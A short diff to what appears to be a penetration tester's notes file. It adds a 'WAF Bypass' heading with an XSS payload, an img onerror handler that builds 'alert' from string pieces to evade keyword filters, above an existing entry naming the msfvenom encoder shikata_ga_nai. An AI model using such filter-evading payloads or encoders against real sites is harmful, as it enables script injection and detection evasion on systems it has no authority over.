@@ -1,5 +1,10 @@
 # Notes
 
+### WAF Bypass
+```
+<img src=x onerror="window['al'+'ert'+'']('WAF Bypassed')"> </img>
+```
+
 ### x86 Msfvenom Encoders (good ones!)
 ```
 x86/shikata_ga_nai
